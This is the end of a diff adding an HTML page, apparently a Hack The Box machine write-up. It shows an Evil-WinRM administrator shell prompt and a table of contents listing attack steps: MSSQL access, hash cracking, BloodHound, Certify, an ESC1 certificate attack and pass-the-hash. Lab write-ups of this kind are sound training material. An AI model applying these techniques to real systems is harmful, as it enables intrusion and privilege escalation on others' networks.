+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt;
+</span></span></code></pre></div>
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="https://pL4sTiC1337.github.io/writeups/htb-giddy/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>HtB Giddy</a>
+        
+	    
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#scanning">Scanning</a>
+      <ul>
+        <li><a href="#nmap">nmap</a></li>
+        <li><a href="#smb---445tcp">SMB - 445/tcp</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-access">Initial Access</a>
+      <ul>
+        <li><a href="#mssql-access">MSSQL Access</a></li>
+        <li><a href="#crack-hash">Crack Hash</a></li>
+        <li><a href="#bloodhound">Bloodhound</a></li>
+        <li><a href="#shell-as-sql_svc">Shell as sql_svc</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-as-ryancooper">Shell as Ryan.Cooper</a>
+      <ul>
+        <li><a href="#winpeasexe">winPEAS.exe</a></li>
+        <li><a href="#certifyexe">Certify.exe</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#esc1-attack">ESC1 Attack</a></li>
+        <li><a href="#pass-the-hash">Pass the Hash</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
